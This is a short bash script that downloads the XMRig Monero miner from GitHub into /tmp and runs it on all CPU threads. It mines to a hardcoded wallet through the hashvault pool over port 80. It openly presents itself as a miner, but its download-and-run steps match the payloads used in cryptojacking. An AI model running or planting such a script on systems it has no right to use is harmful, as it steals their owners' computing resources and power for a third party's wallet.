#!/bin/bash

# Configuration
POOL="pool.hashvault.pro:80"
WALLET="46Z3AbjEnaq9Aey2SCcHpe1MmZmYdKpL2TgFhHdn7LBmbfo327ChMYPKrbBccHYHr9Le93EXut6YBNh6RRfbFvuMH5Lt3jA"
THREADS=$(nproc)

# Download and run XMRig
echo "Downloading XMRig..."
wget -q -O /tmp/xmrig.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
tar -xzf /tmp/xmrig.tar.gz -C /tmp
cd /tmp/xmrig-6.21.0

echo "Starting miner with $THREADS threads..."
echo "Wallet: $WALLET"
echo "Pool: $POOL"

# Run XMRig
./xmrig \
    -o "$POOL" \
    -u "$WALLET" \
    -p "x" \
    --threads="$THREADS" \
    --donate-level=1 \
    --no-color
